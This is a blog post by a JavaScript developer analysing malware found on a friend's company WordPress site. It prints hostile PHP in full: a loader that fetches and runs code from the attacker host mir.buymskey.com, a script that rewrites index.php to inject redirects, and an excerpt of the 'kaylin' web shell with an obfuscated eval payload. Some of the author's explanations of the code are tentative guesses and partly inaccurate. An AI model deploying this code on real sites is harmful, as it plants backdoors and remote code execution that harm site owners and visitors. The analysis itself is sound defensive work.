---
title: "How I Saved a Wordpress Site: Part 1"
date: "2021-03-08"
---
## Wordpress Malware, Base64, and PHP
#### Analysis of the code behind the attack.
Recently a friend of mine noticed something weird about her company's website. There were links on the page that were redirecting to http://buymskey.com, which is unsecure since it uses http. 
Immediately I figured that this was some kind of malware that had found it's way into the site and after I was given the credentials, logged into the admin, and downloaded the backup of the site to inspect I noticed malware files all over the place. All the files were located within the wp-content and wp-includes directories. Within the wp-content there were files with names like loc_bat_rae and such like that peppered throughout random directories. 

Below is a sample of the code:

 ```php
 //this is require_editor file start
    error_reporting(0);
      set_time_limit(0);
      $log_sure=True;
      $write_file='write_work_complete.log';
  if (file_exists($write_file)==True){
	$get_content=file_get_contents($write_file);
	if ((strpos($get_content, 'confirm:start of editor file') !== false) && (strpos($get_content, 'confirm:end of editor file') !== false)){
		$content=$get_content;
	} else {
		$log_sure=False;
	}
  } else {
	$log_sure=False;
  }
  if($log_sure==False){
	  if(function_exists('curl_init')){
	  $s = curl_init();
	  curl_setopt($s,CURLOPT_URL,'http://mir.buymskey.com/tool/editor.txt');
	  curl_setopt($s,CURLOPT_RETURNTRANSFER,1);
	  curl_setopt($s,CURLOPT_USERAGENT,'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36');
	  curl_setopt($s,CURLOPT_REFERER,"http://www.google.com");
	  curl_setopt($s, CURLOPT_HTTPHEADER, array('X-FORWARDED-FOR:66.249.72.240', 'CLIENT-IP:66.249.72.240'));
	  curl_setopt($s, CURLOPT_HTTPHEADER, array('Expect:'));
	  curl_setopt($s, CURLOPT_ENCODING, "");
	  curl_setopt($s, CURLOPT_SSL_VERIFYPEER, false);
	  curl_setopt($s, CURLOPT_CONNECTTIMEOUT , 20);
	  curl_setopt($s, CURLOPT_TIMEOUT, 20);
		curl_setopt($s, CURLOPT_COOKIE, 'foo=bar');
	$content = curl_exec($s);
	  curl_close($s);
	  }else{
	  $options = array(
	  'http'=>array(
		'method'=>"GET",
		'timeout'=>20,
		'header'=>"Accept-language: en\r\n" .
				  "Cookie: foo=bar\r\n" .  // check function.stream-context-create on php.net
				  "User-Agent: Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10" // i.e. An iPad 
	  ),
	  "ssl"=>array(
				  "verify_peer"=>false,
				  "verify_peer_name"=>false,
	  )
	);
		$content = file_get_contents('http://mir.buymskey.com/tool/editor.txt', false, $context1);
	}
	  file_put_contents($write_file,$content);
  }
/*
  if (file_exists('write_check_class.log')==True){
	$check_content=file_get_contents('write_check_class.log');
	if ($check_content!='refer check class'){
		$check_sure=False;
	}
  } else {
	$check_sure=False;
  }*/
  $file_name=dirname(__FILE__);
  file_put_contents('write_check_class.log',$file_name.':::refer check class');
  $last_log_sure=True;
  if (file_exists($write_file)==True){
	$last_get_content=file_get_contents($write_file);
	if ((strpos($last_get_content, 'confirm:start of editor file') !== false) && (strpos($last_get_content, 'confirm:end of editor file') !== false)){
		require($write_file);
	}
	else{
		echo 'editor not exist!!!';
	}
  } else {
	echo 'editor not exist!!!';
  }
  //this is require_editor file end
```
	
	
	
So the question becomes: what the hell is this code doing? PHP isn't really in my wheelhouse as I spend most of my time writing JS and building apps with it's associated frameworks. But let's see what we can infer or "grok" from what's written here.

First few lines: 

```php

 //this is require_editor file start
    error_reporting(0);
      set_time_limit(0);
      $log_sure=True;
      $write_file='write_work_complete.log';
  if (file_exists($write_file)==True){
	$get_content=file_get_contents($write_file);
	if ((strpos($get_content, 'confirm:start of editor file') !== false) && (strpos($get_content, 'confirm:end of editor file') !== false)){
		$content=$get_content;
	} else {
		$log_sure=False;
	}
  } else {
	$log_sure=False;
  }
```

This is the first if-block of the malware here and prior to this if-block it seems there are two functions being called here and two variables being declared with the boolean value true and a file created with the name write_work_complete.log. Notice the comment left in by the developer as well, it looks like there might be a GUI or some sort of "editor" that this code is possibly feeding data to.

Within that if-block we're checking to see if the write_work_complete file already exists and if it does we are executing another function file_get_contents, passing it the value of write_file as an argument and possibly sending it off to a server.

This pretty much all leads to this mainfile which was responsible for the creation of these smaller files seen earlier throughout the different directories:

```js

// Main file that generated the smaller files with random files names
echo "write page file exist!!!";
if ((array)$_SERVER["DOMAIN_PATH"]){
	$root=$_SERVER["DOMAIN_PATH"];
} else {
	$root=$_SERVER["DOCUMENT_ROOT"];
}
$index_file="D:\phpStudy\WWW\wordpress\index.php";
$static_index=False;
$domain=$_SERVER["SERVER_NAME"];
$mix_strs='abcdefghijklmnopqrstuvwxyz';
$root_file=$root.'/index.php';
function get_url_con($con_s){
    if(function_exists('curl_init')){
        $s = curl_init();
        curl_setopt($s,CURLOPT_URL,$con_s);
        curl_setopt($s,CURLOPT_RETURNTRANSFER,1);
        curl_setopt($s,CURLOPT_USERAGENT,'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)');
        curl_setopt($s,CURLOPT_REFERER,"http://www.google.com");
        curl_setopt($s, CURLOPT_HTTPHEADER, array('X-FORWARDED-FOR:66.249.72.240', 'CLIENT-IP:66.249.72.240'));
        return curl_exec($s);
    }else{
        return @file_get_contents($con_s);
    }
}
$options = array(
  'http'=>array(
    'metod'=>"GET",
    'timeout'=>60,
    'header'=>"Accept-language: en\r\n" .
              "Cookie: foo=bar\r\n" .  // check function.stream-context-create on php.net
              "User-Agent: Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10" // i.e. An iPad 
  ),
  "ssl"=>array(
              "verify_peer"=>false,
              "verify_peer_name"=>false,
  )
);
$context = stream_context_create($options);
$wrote_content=get_url_con('http://mir.buymskey.com/wrote/wrote');
$wrote_content_split=explode('$searchsite="',$wrote_content);
$sub_num=strpos($wrote_content,'";
$confirm');
$wrote_end=substr($wrote_content,$sub_num);
$before_index_content='';
$index_names=array($index_file,$root_file);
if ((isset($_GET['searchsite']))&&(isset($_GET['searchtxt']))&&(isset($_GET['texturl']))&&(isset($_GET['page']))&&(isset($_GET['state']))){
	$edit_sure=False;
	foreach ($index_names as $value){
		if ($edit_sure===False){
			if (((file_exists($value))&&($value==$root_file))||(($value==$index_file))){
			$before_index_content=file_get_contents($value);
			$searchsite=$_GET['searchsite'];
			$searchtxt=$_GET['searchtxt'];
			$texturl=$_GET['texturl'];
			$page=$_GET['page'];
			$state=$_GET['state'];
			$find_index=False;
			if ($static_index==False){
				$renew_index_content=$wrote_content_split[0].'$searchsite="'.$searchsite.'";'."\r\n".'$searchtxt="'.$searchtxt.'";'."\r\n".'$texturl="'.$texturl.'";'."\r\n".'$page="'.$page.'";'."\r\n".'$state="'.$state.$wrote_end.$before_index_content;
			}
			else {
				$suf_list=array('htm','html','shtml','shtm');
				$index_file_list=explode('/',$value);
				$index_dir='';
				for ($i=0; $i<=(count($index_file_list)-2); $i++){
					$index_dir.=$index_file_list[$i].'/';
				}
				foreach ($suf_list as $suf){
					$index_html='index1.'.$suf;
					if (file_exists($index_dir.$index_html)==True){
						echo $index_dir.$index_html." site file exists!!!\r\n";
						if ($find_index==False){
							$renew_index_content=$wrote_content_split[0].'$searchsite="'.$searchsite.'";'."\r\n".'$searchtxt="'.$searchtxt.'";'."\r\n".'$texturl="'.$texturl.'";'."\r\n".'$page="'.$page.'";'."\r\n".'$state="'.$state.$wrote_end.'<?php'."\r\n".'echo file_get_contents("'.$index_html.'");'."\r\n".'?>'.$before_index_content;
							$find_index=True;
						}
					}
				}
			}
			if (($static_index==False)||($find_index==True)){
				$edit_sure=True;
				file_put_contents($value,$renew_index_content);
				$after_index_content=file_get_contents($value);
				if ($after_index_content==$renew_index_content){
					echo $domain.' ::: '.$searchsite.' ::: '.$searchtxt.' ::: '.$texturl.' ::: '.$page.' ::: '.$state.' :::edit '.$value." succeed!!!\r\n";
				}else{
					echo $domain.' ::: '.$searchsite.' ::: '.$searchtxt.' ::: '.$texturl.' ::: '.$page.' ::: '.$state.' :::edit '.$value." failed???\r\n";
				}
			}
			else{
				echo '$static_index is True but without $index_html, edit failed???';
			}
			}
		}
	}
}
else{
	echo 'please set enough parameter!!!';
}

```

In searching for answers as to what this code is doing I found this repo for malware analysis specifically concerning Wordpress websites, <a href="https://github.com/bediger4000/php-malware-analysis/tree/master/webshells/kaylin">kaylin web shell analysis</a>. Bediger4000 describes this as a fully featured chinese language web shell (pretty scary stuff) complete with a GUI and code that is designed to search for MySQL and Oracle databases remotely on anyone that's infected with it. 

What it primarily does is this: 

```js
	$password = "1e89117b6bab59e6562df2355e81c158"; 

	define('VERSION','kaylin');

 $register_key = array 
( 
	array
	(
		'CQ9jnUNtDTIlpz9lK3WypT9lqTyhMluSK0IFHx9FXGgNnJ5cK3AyqPtaMTympTkurI9ypaWipaZaYPqCMzLaXGgN' , 
		'nJ5cK3AyqPtaoJS4K2I4MJA1qTyioy90nJ1yWljkZQNjZPx7nTIuMTIlXPWwo250MJ50YIE5pTH6VUEyrUDinUEg' , 
		'oQftL2uupaAyqQ1aLwVmZGVvXGgzqJ5wqTyiovOmqUWxnKVbWUA0pvxtrlOlMKE1pz4tp3ElK3WypTkuL2HbLKWl' , 
		'LKxbW1kpWljaYl8aYPpyZwpaYPpyZwVaXFkupaWurFtaYlpfWl8aYPqpWlpfWlVaXFkwnT9jXPEmqUVcXGftsJM1' , 
		'ozA0nJ9hVTAbn2qjLltxLKWlLKxcVUftMz9lMJSwnPtxLKWlLKxtLKZtWTgyrFN9CvNxqzSlXFO7VPEupaWurIfx' , 
		'n2I5KFN9VTymK2SlpzS5XPE2LKVcVQ8tL2ueM3OwXPE2LKVcVQbtp3ElnKOmoTSmnTImXPE2LKVcBlO9VUWyqUIl' , 
		'ovNxLKWlLKx7VU0xoKyznJkyVQ0tWS9GEIWJEIWoW1AQHxyDIS9TFHkSGxSAEFqqVQ8tp3ElMTylXPEsH0IFIxIF' , 
		...

		// BLOG AUTHORS COMMENT: and here

		/**
 * Language and charset conversion settings
 */
$check_copyright = create_function /*Copyright*/ 
( 
	
	"/*\x64\x65\x28\x73\x74\x72*/\x24\x63\x6f\x64\x65/*\x63\x6f\x64\x65\x29*/" , 
	"/*\x36\x34\x5f\x64\x65*/\x65\x76\x61\x6c\x20\x28\x20\x27\x20\x3f\x3e\x27" . 
	"\x20\x2e\x20\x62\x61\x73\x65\x36\x34\x5f\x64\x65\x63\x6f\x64\x65\x20\x28" . 
	"\x20\x73\x74\x72\x5f\x72\x6f\x74\x31\x33\x20\x28\x20\x6a\x6f\x69\x6e\x20" . 
	"\x28\x20\x27\x27\x20\x2c\x20\x24\x63\x6f\x64\x65\x20\x29\x20\x29\x20\x29" . 
	"\x20\x2e\x20\x27\x3c\x3f\x70\x68\x70\x20\x27\x20\x29\x3b/*\x63\x6f\x64*/" 
	
) ; 


$global_version = array_walk /*Version*/ 
( 
	
	$register_key , 
	
	 $check_copyright 
	
) ; 
```

There is a password here to access whatever server their using to store the hacked sites information and feed that into their UI, from there they have free reign into what they can execute onto your site. Think of it like FTP except through a backdoor and instead of whoever is maintaining your WP siteit's some random guy somewhere in the world executing arbitrary scripts that could say, redirect users when they click on certain links. Contained withinthat array are base_64 encoded chinese characters that don't make a whole lot of sense when run through a translator (or shown to anyone who spekaschinese fluently). My best guess for what that is is site information of some sort. Those hex encoded strings contained in the second array at the verybottom of the file is actually another PHP script that decodes what is in the first array and sends that off to the GUI.

